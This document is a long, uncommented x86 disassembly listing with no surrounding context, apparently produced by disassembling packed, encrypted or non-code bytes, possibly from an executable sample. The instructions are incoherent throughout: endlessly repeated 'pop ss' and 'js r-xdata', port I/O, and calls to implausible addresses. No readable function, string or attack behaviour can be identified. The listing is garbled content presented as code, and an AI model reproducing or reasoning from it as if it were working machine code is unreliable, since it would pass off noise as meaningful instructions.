sar [ eax - 0x14911848 ] cl
call 0xffffffffb5a7fc05
add [ esi + 0x26 ] esi
pop ss
sub dl [ edi ]
pop ss
adc [ gs : 0x1a011717 ] dl
sub bh ah
js r-xdata
pop ss
js r-xdata
js r-xdata
pop ss
pop ss
js r-xdata
js r-xdata
insd
adc al 0x63
js r-xdata
out 0x6d eax
lodsd [ esi ]
cmp [ esi - 0x37afe48 ] bh
call 0x78be8b1f
out 0x6c eax
push cs
sub al 0x17
pop ss
and [ gs : 0x6d651717 ] dl
and [ ecx ] eax
cmp ah ch
call 0x63be8b04
cwde
aam 0xeb
sbb [ ecx ] al
xchg ebp eax
or edx [ edi ]
pop ss
js r-xdata
insb
pop ss
mov eax 0x105c6565
pop ss
pop ss
add [ ecx + 0x39 ] al
pop ss
pop ss
mov cl 0x6b
adc cl ch
and [ 0x41001717 ] dl
or al 0x17
call 0xffffffffbda9fa86
loopne r-xdata
mov edx 0x78e8e8eb
js r-xdata
js r-xdata
add edx [ edi ]
pop ss
js r-xdata
in eax dx
sub edi [ eax + 0x78 ]
js r-xdata
jmp 0xffffffffe932da72
pop ss
pop ss
scasd [ edi ]
add [ 0x78e8e8ea ] ebx
js r-xdata
lodsd [ esi ]
xor al 0xd3
scasb [ edi ]
fadd [ ecx ]
inc ecx
sbb al 0x17
call 0xffffffffbb5def24
scasd [ edi ]
pop ss
jle r-xdata
insd
xor [ edi + 0x17 ] edx
pop ss
mov esi 0x170c5000
pop ss
popfd
sbb al 0x17
mov edi 0x321019c
pop ss
pushfd
mov fs [ ecx - 0x6b ]
js r-xdata
js r-xdata
js r-xdata
add [ ebp + 0x78e8e8fc ] eax
js r-xdata
call 0x78be8ac4
js r-xdata
pop ss
js r-xdata
insd
adc al ch
js r-xdata
call 0x78be8e5c
js r-xdata
pop ss
js r-xdata
js r-xdata
shr [ ebx ] cl
out 0x6c eax
and al 0xe0
call 0x120e15f2
pop ss
pop ss
mov dl 0x1
cmpsd [ esi ] [ edi ]
pop ss
pop ss
js r-xdata
pop ss
fld [ eax ]
js r-xdata
0x7878e8e8 0x7878
js r-xdata
pop ss
js r-xdata
call 0x1d47fc2d
call 0xffffffffea63152e
out 0x6a eax
xor dl [ edi ]
pop ss
fld [ eax ]
popad
lodsb [ esi ]
int3
js r-xdata
pop eax
xchg ebp eax
js r-xdata
js r-xdata
pop ss
arpl [ ebp + 0x19610138 ] bp
pop ss
pop ss
js r-xdata
or [ ecx - 0x71617d50 ] 0x61
lodsd [ esi ]
sbb [ eax + 0x5019882 ] dh
loopne r-xdata
pop ss
js r-xdata
js r-xdata
pop ss
mov cl 0x6d
sub bh ah
insb
and dl [ edi + 0x17 ]
pop ss
fld [ eax ]
mov dh 0xb3
adc eax 0xbbb81717
js r-xdata
call 0x357116db
js r-xdata
js r-xdata
mov edi 0x79501e0
js r-xdata
js r-xdata
loopne r-xdata
js r-xdata
pop ss
js r-xdata
pop ss
add ebp ebp
add [ ebp + 0x10 ] esp
pop ss
mov fs [ ecx - 0x4b ]
adc [ ebx + 0x36 ] ah
mov fs [ ecx - 0x4b ]
adc ah [ ebx + 0x30 ]
mov fs [ ecx - 0x4b ]
call 0x16c4156b
add [ ebp + 0x17555a01 ] 0x17
pop ss
js r-xdata
sub [ eax + 0x17020701 ] ch
js r-xdata
insb
loop r-xdata
popfd
loopne r-xdata
lodsd [ esi ]
xchg ebp eax
mov bh 0x1
add [ edx ] ebx
pop ss
pop ss
js r-xdata
cmp al 0x1
push ss
push esi
pop ss
pop ss
imul ebp [ esp ] 0x6d
sub bh ah
insb
push ebp
pop ss
js r-xdata
js r-xdata
sbb [ eax + 0x170aed01 ] 0x17
mov esi 0xe7286da4
insb
add al 0x68
add [ ebx ] ch
js r-xdata
cld
insd
sub al 0x68
call 0x182e9802
pop ss
js r-xdata
js r-xdata
pop ss
pop ss
js r-xdata
pop es
xchg ebp eax
js r-xdata
add [ edi + 0x78171755 ] eax
js r-xdata
js r-xdata
pop ss
js r-xdata
add dl [ edi ]
add [ edi ] eax
arpl [ edx ] bp
mov fs [ ecx - 0x53 ]
[ edi + 0x1d ] ebp
pop ss
pop ss
js r-xdata
push 0xe7eaf895
insd
add [ ecx ] ch
pop ss
pop ss
js r-xdata
call 0xffffffffe9303048
call 0x78be8bc4
js r-xdata
js r-xdata
xor eax 0x2c6b1717
and [ ebx ] ebp
js r-xdata
outsb
sub al 0xf0
js r-xdata
js r-xdata
or [ edi ] edx
jg r-xdata
call 0xffffffff832efd80
call 0xffffffffc912b134
push ebp
pop ss
pop ss
js r-xdata
movsd [ edi ] gs : [ esi ]
sub al 0x65
lodsd [ esi ]
dec esp
add [ ecx + ecx + 0x17 ] esi
add [ edi + 0x53d101b0 ] 0x17
pop ss
js r-xdata
sub al 0xe4
add [ edi ] edx
js r-xdata
js r-xdata
js r-xdata
pop ss
js r-xdata
pop ss
arpl [ ecx + edi * 4 ] ax
mov ecx 0xe8ef1d01
call 0x3bf6164d
pop ss
clc
0x29006de7 0x1717
mov ebx 0x17349d17
test al 0x1
pop es
js r-xdata
js r-xdata
sbb eax 0x78e8e8ea
js r-xdata
add [ ebp - 0x18 ] edi
call 0xfffffffff8981719
call 0x595188e
pop ss
insd
and [ 0xffffffffbbb81717 ] dl
js r-xdata
js r-xdata
js r-xdata
popad
js r-xdata
js r-xdata
pushfd
int3
js r-xdata
js r-xdata
pop ss
call 0x201fd75
adc [ gs : edi ] dl
pop ss
js r-xdata
cmp edx [ edi ]
js r-xdata
js r-xdata
js r-xdata
js r-xdata
add [ edi + 0x3a ] eax
pop ss
pop ss
js r-xdata
js r-xdata
js r-xdata
call 0x2921fd32
mov dh 0xb3
add [ edx + 0x36 ] esi
sub cl [ esi + 0x1f0ad61 ]
outsd
sbb eax 0x78781717
call 0x78be8c33
or [ eax + 0x17bc9e17 ] bh
lodsd [ gs : esi ]
js r-xdata
sbb al 0xe8
call 0x519396e9
js r-xdata
pop ss
mov ebx 0x17558701
pop ss
lodsb [ esi ]
int3
enter 0xbe17 0x9c
js r-xdata
jmp r-xdata
js r-xdata
add [ esi ] ecx
sbb al 0xe9
call 0xffffffffe1052c4d
pop ss
jg r-xdata
popfd
xor al 0x17
add [ edi ] dl
pop ss
js r-xdata
sbb [ ecx ] al
push cs
pop ss
js r-xdata
js r-xdata
movsd [ edi ] [ esi ]
push esi
js r-xdata
push es
pop ss
pop ss
js r-xdata
or al 0x6
js r-xdata
jmp r-xdata
mov esi 0xccac179c
cld
arpl [ esp + ecx * 8 - 0x13502c04 ] bp
js r-xdata
call 0x78be8ded
js r-xdata
pushfd
int3
sbb [ ecx + ebp * 8 ] 0xe8
call 0x1826d37d
js r-xdata
xor [ edi ] edx
pop ss
js r-xdata
imul ebp [ esp ] 0x1
js r-xdata
pop ss
js r-xdata
call 0x175c3ff7
js r-xdata
rol [ eax - 0x17172718 ] 0x1
push eax
movhps [ edi ] xmm2
js r-xdata
js r-xdata
mov cl 0x82
js r-xdata
js r-xdata
js r-xdata
js r-xdata
popfd
clc
pop ss
popfd
in al 0x17
js r-xdata
add [ edi ] edx
pop ss
js r-xdata
popad
call 0x177b40f4
js r-xdata
jmp 0xffffffffbf5dfd4c
pop ss
pop ss
in al 0x1
arpl [ eax ] bx
insd
and al ch
popad
outsb
js r-xdata
js r-xdata
outsb
pushfd
js r-xdata
sub al 0x63
sbb [ esi + ecx * 4 - 0x4ed55a9f ] 0x82
js r-xdata
cmp al 0x65
lodsd [ esi ]
or al 0x1
pop ss
pop ss
pop ss
js r-xdata
0xbebbe8e8 0xac82
pop ss
sub [ ebx + ebx * 8 + 0x60ad6533 ] 0xbb
mov eax 0x17044301
pop ss
js r-xdata
call 0x2221fe9d
add [ 0x1f171711 ] esp
sub esi [ 0x2c6b1717 ]
js r-xdata
push eax
call 0x2f46ffd6
xor al 0x17
js r-xdata
add dl [ eax + 0x17 ]
out 0x6c eax
push ss
sbb [ edi ] dl
pop ss
add [ ebp + 0x3e ] esp
pop ss
pop ss
arpl [ ebx + 0x61ec82fc ] bp
lodsb [ esi ]
int3
sub dh [ ecx + 0x618e9d82 ]
movsd [ edi ] [ esi ]
popad
js r-xdata
mov fs [ ecx - 0x5b ]
js r-xdata
push edx
popfd
clc
scasb [ edi ]
add [ edi ] esp
aaa
pop ss
pop ss
js r-xdata
and eax 0x1f171711
mov al [ ecx ]
fucom st0
call 0x78be8f25
lodsd [ gs : esi ]
js r-xdata
pop ss
js r-xdata
pop ss
or [ ebx - 0x3b ] 0xb
idiv [ edi + 0xc0ae61 ]
push ecx
xor al 0x17
pop ss
cmp [ ebx - 0x40e51e8a ] 0x61
scasb [ edi ]
int3
call 0x347517d7
pop ss
mov edi 0xec571863
jmp 0x6605ff64
js r-xdata
js r-xdata
js r-xdata
movsd [ edi ] [ esi ]
js r-xdata
pop ss
js r-xdata
pop ss
rcl [ esp + ecx * 8 + 0x500201dc ] 0x1
pop ss
js r-xdata
lodsb [ esi ]
mov eax 0x1725d501
js r-xdata
imul ebp [ eax + esi * 8 ] 0x61
js r-xdata
sub edi [ eax + 0x78 ]
js r-xdata
js r-xdata
aaa
add ebp eax
and edx [ edi ]
sbb [ ebp + 0x2ca5618e ] 0x63
add ecx ecx
popfd
mov fs [ ecx - 0x5b ]
mov cl 0x82
js r-xdata
xchg esp eax
int3
js r-xdata
add ebp edx
js r-xdata
js r-xdata
mov ebp 0x36f900e4
js r-xdata
js r-xdata
js r-xdata
js r-xdata
js r-xdata
push edi
pop ss
pop ss
js r-xdata
leave
fadd [ ecx ]
and eax 0x78781717
js r-xdata
js r-xdata
add [ ecx - 0x1a ] ebp
call 0x78be91ba
js r-xdata
js r-xdata
pop ss
mov eax 0xe09d17
add cl bh
add [ esi - 0x4ee8e8f9 ] ch
and [ ebx ] ebp
js r-xdata
pop ss
arpl [ ebp + 0x36f900e4 ] di
js r-xdata
pop ss
pop ss
js r-xdata
and [ ecx ] eax
add [ eax ] eax
pop ss
pop ss
mov eax 0x17238701
pop ss
js r-xdata
pop ss
out 0x6c eax
test eax 0x63171734
cmpsb [ esi ] [ edi ]
rol [ ecx ] 0xc8
pop ss
pop ss
imul edx [ eax ] 0xffffffe9
out 0x6c eax
xor edi ebp
call 0xffffffffd15df2aa
call 0x174b65a8
mov ch 0xf8
out 0x6d eax
jne r-xdata
pop ss
js r-xdata
lds esp [ ebx ]
pop ss
mov edi 0xe8ebba01
pop ss
js r-xdata
js r-xdata
insb
std
mov edi 0x17354700
pop ss
mov cl 0xb1
insd
sub [ ecx ] al
mov eax 0xdb17171a
sub [ eax + 0x78782b21 ] ch
call 0x4dc6fee8
push ecx
sub bh ah
insb
mov ah 0x35
pop ss
pop ss
pop ss
sahf
mov esp 0x1732a101
pop ss
js r-xdata
add bl ch
and dl [ edi ]
pop ss
imul ebp [ esp + edi * 8 ] 0x6d
sbb al 0x17
js r-xdata
out 0xe8 al
call 0x78be914b
js r-xdata
fsub [ eax ]
js r-xdata
pop ss
in al 0x0
stc
js r-xdata
pop ss
pop ss
add [ edi + 0x6317172a ] ah
arpl [ ecx ] bp
and [ ebx ] ebp
js r-xdata
js r-xdata
js r-xdata
imul esp [ edi + edx ] 0x17
pop ss
pop ss
insd
and [ 0x1b81717 ] dl
popad
xor esp edi
js r-xdata
pop ss
js r-xdata
pop ss
js r-xdata
add eax 0x78781717
js r-xdata
rol [ 0x78781717 ] 0x1
pop ss
js r-xdata
scasb [ edi ]
pop ss
js r-xdata
pop ss
add [ ecx + 0xd ] ecx
pop ss
pop ss
js r-xdata
mov ebx 0x65bbbbbb
insd
js r-xdata
pop ss
js r-xdata
insb
js r-xdata
js r-xdata
js r-xdata
js r-xdata
js r-xdata
js r-xdata
insd
cmp al 0x15
pop ss
pop ss
mov eax 0x3c5561bb
adc eax 0x89011717
push edi
pop ss
pop ss
mov eax 0xb8ef5ee7
add [ eax + 0xc ] edi
pop ss
pop ss
js r-xdata
dec eax
mov ebx 0x6d65bbbb
adc eax 0x17b81717
mov edi 0x7f17bbb8
inc esp
mov ebx 0x486d65bb
js r-xdata
call 0xffffffffe8c903f5
pop ss
jle r-xdata
das
lodsd [ esi ]
pop esp
mov al 0x8d
xchg [ esi - 0x5aaf52d1 ] bh
movsd [ edi ] [ esi ]
mov al 0x8d
das
lodsd [ esi ]
push esp
xchg [ esi - 0x2cff5a5b ] bh
xor [ edi ] edx
pop ss
mov bh 0xb6
mov bl 0x6d
add [ esi + ecx ] esp
js r-xdata
call 0xffffffffccea7dbb
clc
in al dx
add ebx edx
sub ah ch
out 0x6c eax
js r-xdata
js r-xdata
js r-xdata
xor [ edi ] edx
pop ss
js r-xdata
shl [ ecx ] 0x1
pop ss
pop ss
arpl [ ecx + ebp * 2 ] ax
pop ss
js r-xdata
insd
js r-xdata
lea esi [ eax + 0x14ad618e ]
call 0x124803fd
adc [ edi ] edx
pop ss
js r-xdata
fld [ eax ]
mov fs [ ecx - 0x53 ]
push ss
lodsd [ gs : esi ]
sbb [ ecx ] al
push esp
and al 0x17
pop ss
mov fs [ ecx - 0x6b ]
arpl [ cs : esi ] dx
mov fs [ ecx - 0x6b ]
and [ ecx ] al
sbb eax 0x7817172e
mov fs [ ecx - 0x4b ]
clc
popad
lodsd [ esi ]
js r-xdata
pop ss
pop ss
fld [ eax ]
mov cl 0xb1
popad
push cs
js r-xdata
insd
and edi esp
insb
js r-xdata
js r-xdata
add dl al
cmp edx [ edi ]
pop ss
insd
sub [ ecx ] al
imul esp esi 0x7878e8e8
js r-xdata
insb
out 0x32 al
pop ss
out 0x6c eax
pop ss
add [ edi ] ebp
xor dl [ edi ]
js r-xdata
call 0xbce8504
pop ss
pop ss
imul ebp [ eax ] 0xffffffea
add [ edi ] esi
or dl [ edi ]
add al 0xf8
in al dx
call 0x24ec199f
js r-xdata
pop ss
pop ss
js r-xdata
js r-xdata
pop ss
mov eax 0x1782f682
and [ gs : 0x57001717 ] dl
push edi
pop ss
pop ss
add [ eax ] ebx
or eax 0x6ce71717
out dx eax
call 0x20aa03bf
add [ ecx ] dl
and edx [ edi ]
pop ss
pop ss
pushfd
int3
add al 0x17
pop esp
in al dx
out 0x6c eax
js r-xdata
push edi
pop ss
pop ss
js r-xdata
rcl [ edi + 0x17 ] cl
inc eax
js r-xdata
add [ edi ] ecx
push edx
pop ss
pop ss
js r-xdata
movsd [ edi ] gs : [ esi ]
adc al 0xb9
mov eax 0x17537201
pop ss
lodsd [ gs : esi ]
xor al 0xb8
lodsd [ gs : esi ]
push 0x1707e701
js r-xdata
pop ss
pop ss
js r-xdata
add al 0x15
js r-xdata
cli
arpl [ edi ] si
mov fs [ ecx - 0x4b ]
lodsb [ esi ]
sbb [ edx - 0x4a9e714d ] 0xae
add [ edx + 0x78171703 ] ebp
js r-xdata
popad
xchg ebp eax
adc [ ecx ] al
xor [ edi ] dl
pop ss
js r-xdata
lodsd [ esi ]
adc al 0xb8
pop ss
aas
add [ eax - 0x47e8e8de ] edi
xor dh 0x82
pop ss
pop ss
js r-xdata
sbb dh [ eax + 0x618ec682 ]
lodsd [ esi ]
sbb al 0xb0
mov fs [ ecx - 0x53 ]
push ds
or [ ebp - 0x529e7150 ] 0x10
adc [ eax - 0x529e7150 ] 0x12
or [ ebp - 0x529e7150 ] 0x14
mov fs [ ecx - 0x53 ]
mov ch 0x10
js r-xdata
js r-xdata
pop ss
pushfd
int3
call 0xfffffffff8f17fd8
mov ebx 0x1739e001
pop ss
js r-xdata
js r-xdata
mov cl 0x1
js r-xdata
or eax 0x65781717
insd
dec eax
adc eax 0x30011717
das
sub al 0x1
pop ebp
call 0x78bf015b
js r-xdata
add al 0xe0
0x6d65e8e8 0x1510
add al 0x69
call 0xffffffff8cc900d1
add edx esp
adc eax 0x78781717
add [ esi + 0x618e2063 ] 0xa5
sbb [ ecx ] al
cld
out dx al
call 0xffffffffdd17a6e8
stc
out 0x6d eax
out 0xe8 al
call 0xffffffffea7083f2
mov gs [ ebx - 0x2c ]
stc
mov eax 0xbbb8bf17
pop ss
jg r-xdata
js r-xdata
popad
lodsd [ esi ]
insd
pop ss
js r-xdata
xor dl [ edi ]
pop ss
arpl [ ebp + 0x32dc00e4 ] di
pop ss
pop ss
mov ebp 0x32c4001c
pop ss
pop ss
pop ss
adc eax 0xd4001717
js r-xdata
popfd
loopne r-xdata
js r-xdata
add edx ecx
push ss
pop ss
pop ss
mov fs [ ecx - 0x53 ]
xor [ ebx + 0x29 ] ah
add [ eax + ebx + 0x17 ] ebp
pop ss
js r-xdata
js r-xdata
das
js r-xdata
call 0xffffffff805785c7
out 0x6a eax
inc ebx
in al dx
call 0xffffffffe75d87d0
insd
dec ebx
in al dx
lodsd [ esi ]
cmp al 0xb8
add ecx esi
aas
pop ss
pop ss
js r-xdata
push ebx
js r-xdata
salc
js r-xdata
and [ edi ] dl
add [ eax ] esi
js r-xdata
pop es
pop ss
pop ss
mov cl 0x21
sub edi [ eax + 0x78 ]
mov ch 0x14
popad
movsd [ edi ] [ esi ]
sbb al 0x61
mov ebp 0x14ad6310
popad
lodsd [ esi ]
or al 0x63
lodsd [ esi ]
adc [ ecx - 0x53 ] ah
add [ ebx - 0x53 ] ah
sbb al 0x61
lodsd [ esi ]
add al 0xdb
sub bl bl
cmp al [ ecx ]
imul esp [ 0x78781717 ] 0x78
js r-xdata
js r-xdata
js r-xdata
js r-xdata
js r-xdata
add ah dl
insd
pop ss
js r-xdata
add [ edi + edx ] dl
pop ss
add esi edx
xor [ edi ] dl
pop ss
imul edx [ ebp - 0x1fe171c ] 0x38
pop ss
pop ss
js r-xdata
insd
js r-xdata
sub bh ah
insb
pop ss
js r-xdata
js r-xdata
js r-xdata
sub bh ah
insb
sbb al 0x4
pop ss
pop ss
add [ ebx + 0x78781717 ] edx
js r-xdata
mov dh 0xb3
insd
call 0x2922032c
popad
mov ch 0x8
popad
mov ch 0x1c
mov ss bx
scasb [ edi ]
out dx al
out 0x6b eax
aaa
xor al 0x17
pop ss
add [ edi - 0x47e8e8f0 ] edi
sub dl 0x80
test [ ss : edi ] edi
dec ebx
pop ss
pop edi
and al 0xe8
call 0x4a11c52
pop ss
pop ss
out 0x6c eax
push cs
pop ss
js r-xdata
pop ss
pop ss
js r-xdata
js r-xdata
call 0x1c1285fa
pop ss
pop ss
mov gs [ ebx - 0x2e ]
call 0xffffffff8f304276
imul edx esp 0xfffffff9
xchg edi eax
js r-xdata
js r-xdata
movsd [ edi ] [ esi ]
add [ ebp - 0x53 ] ah
js r-xdata
mov fs [ ecx - 0x53 ]
adc bl bl
sub [ esi + 0x6514ad61 ] cl
arpl [ ebx + ebp * 2 ] ax
add al 0xb0
add [ edx + 0x3f ] edx
pop ss
pop ss
js r-xdata
lodsd [ esi ]
sbb al 0xbb
pop ss
mov ebp 0x46d65f8
adc al 0x65
and edi esp
insb
or ebx [ 0x26001717 ]
aas
pop ss
pop ss
insd
sub [ ecx ] al
js r-xdata
mov eax 0x172fd501
pop ss
js r-xdata
stosb [ edi ]
add [ eax ] edx
out dx eax
call 0x61d494a5
clc
mov gs [ ebp + 0x3a ]
out 0x6c eax
bound esp [ ebx ]
pop ss
pop ss
add [ ebp + 0x5b ] ebp
pop ss
pop ss
sub ah 0x80
call 0x182f04ac
sahf
mov eax 0x687f17bb
call 0xffffffff9e5e04c7
mov eax 0xbb1cad61
lodsd [ gs : esi ]
dec esp
add esp edx
pop ss
pop ss
movsd [ edi ] gs : [ esi ]
pop esp
sub al 0x17
add esi edx
js r-xdata
pop ss
js r-xdata
js r-xdata
in al dx
js r-xdata
js r-xdata
js r-xdata
pop ss
js r-xdata
mov eax 0xe8e9ec80
call 0xffffffffe896969a
call 0x16e8670
push esp
das
pop ss
pop ss
js r-xdata
insb
loop r-xdata
jmp 0x60138b7d
js r-xdata
js r-xdata
push ebx
js r-xdata
inc eax
das
lodsd [ esi ]
add [ ebx + 0x2fa3a5be ] ah
lodsd [ gs : esi ]
mov ebp 0x175af501
arpl [ ebp + 0x14ad61e0 ] bp
add [ ebp + edx * 2 + 0x17 ] ebp
js r-xdata
js r-xdata
mov fs [ ecx - 0x6b ]
push ds
add [ ebx ] edx
push ds
pop ss
pop ss
or [ edx - 0x529e7150 ] 0x10
sbb [ ebx - 0x529e7150 ] 0x12
fld [ eax ]
mov fs [ ecx - 0x53 ]
js r-xdata
and al 0xe
js r-xdata
js r-xdata
call 0xffffffff94b3800a
js r-xdata
scasb [ edi ]
out dx al
out 0x6b eax
loop r-xdata
call 0xffffffff832f1214
jmp r-xdata
pop ss
mov al 0x8e
popad
lodsd [ esi ]
adc al 0xdb
sub [ esi + 0x116ad61 ] cl
mov esi esp
call 0x78be9205
out 0x7 eax
pop ss
out 0x5f eax
scasb [ edi ]
out dx al
pop ss
lodsd [ esi ]
sbb al 0x1
add eax 0x78171718
js r-xdata
call 0xffffffffc8dd8979
int 0x5f
pop ss
pop ss
imul edx [ edi + 0x6de7e9f4 ] 0x1e
jmp r-xdata
insd
js r-xdata
js r-xdata
out 0x6c eax
js r-xdata
pop ss
js r-xdata
mov edi 0xc8ae61
mov [ esi ] edi
movsd [ edi ] [ esi ]
mov [ 0x31de01be ] eax
pop ss
pop ss
js r-xdata
movsd [ edi ] [ esi ]
mov [ 0xffffffffbe04ad2f ] eax
js r-xdata
js r-xdata
mov bh 0xb6
add [ 0xffffffff80e8e8e0 ] ecx
cmp bh ch
js r-xdata
sub al 0xf0
insd
sub bh ah
insb
pop ss
add eax 0x17821717
mov eax 0xb401ea82
sub edx [ edi ]
pop ss
pop ss
js r-xdata
push ebp
pop ss
nop
0xc5201e8 0x1717
js r-xdata
add [ edi ] ecx
js r-xdata
insd
sub edi [ eax + 0x78 ]
pop ss
pop ss
js r-xdata
call 0x174ac0b4
pop ss
js r-xdata
push ss
add [ ecx + 0x78e8e8e6 ] ecx
js r-xdata
js r-xdata
jge r-xdata
js r-xdata
call 0xffffffffe10434ca
insd
push esp
adc dl [ edi ]
pop ss
mov eax 0x1c4be17
0x1707
out dx eax
push edi
or ah [ eax ]
pop ss
pop ss
insd
sub bh ah
insb
sub bl [ 0x4d011717 ]
sbb eax 0x2bb61717
adc eax 0x17173f
mov eax [ 0xffffffffb8be63d4 ]
add [ edi + 0x1c ] ebx
aas
sbb al 0x17
pop ss
add [ esi + 0x6317170c ] ah
movsd [ edi ] [ esi ]
loopne r-xdata
js r-xdata
lodsd [ esi ]
add al 0xbe
das
pop ss
js r-xdata
mov dl 0x82
or [ esi - 0x4dff429f ] 0x618e9a82
mov ebp 0x5d0e0102
pop ss
pop ss
js r-xdata
pop ss
js r-xdata
add ebp esi
pop edx
pop ss
js r-xdata
sub al 0xe8
js r-xdata
pop ss
mov fs [ ecx - 0x4b ]
inc eax
mov bl 0x8e
popad
mov ch 0x42
add ebp edi
pop ds
pop ss
pop ss
pop ss
popfd
add [ edi ] dl
jg r-xdata
pop ss
mov eax 0x172a6401
out 0x6d eax
cmc
or edx [ edi ]
pop ss
add [ edi ] ebp
push edi
pop ss
pop ss
add [ eax ] 0xeb
call 0x747da7
jpe r-xdata
out 0xe8 al
call 0x78be9196
lodsd [ esi ]
adc al 0x1
pop ss
js r-xdata
mov eax 0x168ad65
add [ cs : edx + 0x7817171a ] esp
mov ss bx
imul edx [ ebx ] 0xffffffe1
add [ ecx + 0x7817171b ] edi
mov eax 0xe8e98d01
call 0xffffffff8e7481a9
popad
lodsd [ esi ]
arpl [ ecx ] dx
out 0x6c eax
std
call 0xffffffff94b2066d
popad
lodsd [ esi ]
sbb al 0xd3
das
add [ edi + ebp + 0x78781717 ] ebx
js r-xdata
js r-xdata
pop [ ecx ]
movaps [ edi ] xmm2
js r-xdata
arpl [ eax ] sp
mov fs [ ecx - 0x53 ]
adc bl bl
sub [ edx - 0x529e7170 ] al
adc al 0x1
das
insd
mov bh [ edx ]
pop ss
pop ss
add [ edx + 0x1717172d ] ebp
popfd
sbb al 0x1
mov eax 0x78171703
js r-xdata
das
pop ss
pop ss
cmp [ edi - 0x5 ] 0xc9
push esi
mov edi 0xe0ae61
mov ebx 0x8017173e
adc [ edi + edx * 8 ] ah
mov eax [ 0xffffffffecae61bf ]
add [ ebp + 0x117173e ] ch
popad
scasb [ edi ]
enter 0x8900 0x3e
js r-xdata
add al 0xb0
add [ ecx + 0x17097e01 ] 0x17
js r-xdata
mov fs [ ecx - 0x53 ]
pop ss
js r-xdata
clc
call 0xffffffffe0c704b1
and [ ecx - 0x35 ] 0x17
pop edi
sub al 0xe8
call 0x2ac11a23
pop ss
pop ss
add ebp esp
jmp r-xdata
pop ss
js r-xdata
js r-xdata
pop ss
pop ss
arpl [ eax ] si
imul ebp [ esp ] 0x6d
pop ss
pop ss
add eax edx
or edx [ edi ]
pop ss
add [ esp + edi ] dl
js r-xdata
js r-xdata
js r-xdata
lodsd [ esi ]
in al 0xe7
insb
push 0x25
pop ss
js r-xdata
lodsd [ esi ]
adc [ edi ] dl
mov edi 0x1286dbc
std
xor [ edi ] edx
pop ss
js r-xdata
cmp [ eax ] 0xe9
jmp 0xffffffffbb79faca
popad
mov ch 0xc
or [ edi + 0x17290f01 ] 0x17
pop ss
add [ 0xffffffffbe7e8b13 ] 0x1
add edx [ edi ]
pop ss
js r-xdata
js r-xdata
call 0xffffffffccda896e
cld
jmp 0xffffffffe9288a73
js r-xdata
sub ah 0xe9
js r-xdata
js r-xdata
js r-xdata
adc al 0x3c
js r-xdata
pop ss
js r-xdata
js r-xdata
arpl [ esi ] bp
add [ edi + 0xe ] cl
js r-xdata
push 0x61e8e8e8
outsb
sub al ch
call 0xffffffffe771f2d9
popad
lodsd [ esi ]
push es
mov al 0x82
lea esi [ ebx + 0x18ad618e ]
sbb [ edx + 0x12b63 ] 0xea
call 0x78be9855
js r-xdata
js r-xdata
pop ss
pop ss
or al 0x17
pop ss
arpl [ ebp - 0x2b5e9c20 ] sp
arpl [ esi + 0x1c5f01b8 ] di
and [ gs : 0xfffffffff0001717 ] dl
sub [ edi ] dl
insd
and [ 0x17b81717 ] dl
mov esi 0x6b21db8c
adc [ edi ] dl
out 0x7d eax
sub [ ebx + 0x11 ] esp
enter 0xe7e9 0x6d
imul edx [ esp + ecx * 8 + 0x6ce7e9fc ] 0xffffffe2
call 0xffffffff97b20678
js r-xdata
jmp 0x6dac0309
js r-xdata
adc [ ecx ] al
js r-xdata
js r-xdata
insb
popad
lodsd [ esi ]
adc al 0x1
imul edx [ esp + ecx * 8 + 0x6ae7fcf8 ] 0xffffff86
das
js r-xdata
js r-xdata
pop ss
pop ss
lodsd [ esi ]
insd
pop ss
js r-xdata
js r-xdata
call 0x28b480d3
call 0x2c1a07d8
out 0x6d eax
js r-xdata
int3
add [ edi + 0x7817171a ] edi
arpl [ edi ] bp
call 0x15da8788
pop ss
and [ ebx ] ebp
js r-xdata
0x1716
insd
js r-xdata
pop ss
call 0x1fe0782
jo r-xdata
int3
js r-xdata
push esi
js r-xdata
js r-xdata
js r-xdata
pop ss
add [ ebp + 0x38 ] ebp
pop ss
pop ss
js r-xdata
[ edi ] dl
popad
mov ebp 0x618eb28a
mov ebp 0xfac018c
pop ss
pop ss
js r-xdata
adc eax 0x1b81717
sub dl [ fs : edi ]
js r-xdata
jb r-xdata
out 0x6c eax
js r-xdata
insd
sub esp edi
pop ss
pop ss
js r-xdata
pop ss
pop ss
sub al 0x17
jle r-xdata
cld
out 0x6a eax
xchg [ edi ] ch
mov cl 0x82
pushfd
add [ eax ] ebp
add eax 0x28db1717
mov dl 0x38
mov esi 0x17106b8c
js r-xdata
pop ss
js r-xdata
pop ss
pop ss
mov cl 0x6d
sub bh ah
insb
jmp r-xdata
add [ cs : edi + 0xe ] cl
in al 0x8
pop ss
pop ss
retn
out 0x6d eax
pop ss
call 0x5d4747d5
lea ecx [ esi - 0x4fc5529f ]
add [ esi + 0x17028801 ] 0x17
sub edx [ edi ]
sub [ ecx ] al
js r-xdata
cli
sub [ edi ] edx
js r-xdata
out 0x6d eax
imul edx [ eax ] 0x17
js r-xdata
mov ebx 0xae65ec82
js r-xdata
js r-xdata
fld [ eax ]
mov dh 0xb3
and [ ebx ] ebp
js r-xdata
pop ebp
xor [ ebp + 0x17 ] ch
js r-xdata
pop ss
arpl [ eax ] dx
arpl [ esi ] bp
js r-xdata
pop ss
js r-xdata
fdivr [ eax + 0x6310ad63 ]
push 0xe8e8e84c
imul ebp [ eax ] 0xffffffe0
add [ ecx + 0x5c ] esp
pop ss
pop ss
imul edx [ ebp - 0x33fe17ec ] 0x38
pop ss
pop ss
js r-xdata
in al dx
js r-xdata
test al 0x1
js r-xdata
js r-xdata
js r-xdata
pop ss
js r-xdata
add [ eax + 0x78171737 ] ebx
js r-xdata
pop ss
js r-xdata
add ch bh
adc [ ebx + 0x2e ] ah
js r-xdata
test eax 0x8217175b
jmp 0xffffffffc812cde7
insd
js r-xdata
scasb [ edi ]
[ ecx + eax + 0x17173ed0 ] 0x78
call 0x7c480973
pop ss
salc
js r-xdata
aaa
pop ss
sub eax 0x2d011717
sub [ esi + 0x6502ad61 ] cl
js r-xdata
js r-xdata
scasb [ edi ]
js r-xdata
js r-xdata
cwde
aaa
js r-xdata
inc edi
add ch bh
js r-xdata
pop ebx
js r-xdata
or edx [ edi ]
insb
add [ edx - 0x15 ] ebp
js r-xdata
pop ss
pop ss
js r-xdata
sub edi [ eax + 0x78 ]
js r-xdata
sub esp edi
insb
neg [ edi + edx ]
pop ss
arpl [ eax ] sp
add [ edx + eax ] edi
push esp
adc dl [ edi ]
pop ss
popad
lodsd [ esi ]
js r-xdata
pop ss
js r-xdata
arpl [ ebp - 0x44169e1c ] sp
add [ ebp - 0x14e8e8f8 ] edx
lodsd [ esi ]
loopne r-xdata
js r-xdata
pop ss
add dl [ edi ]
js r-xdata
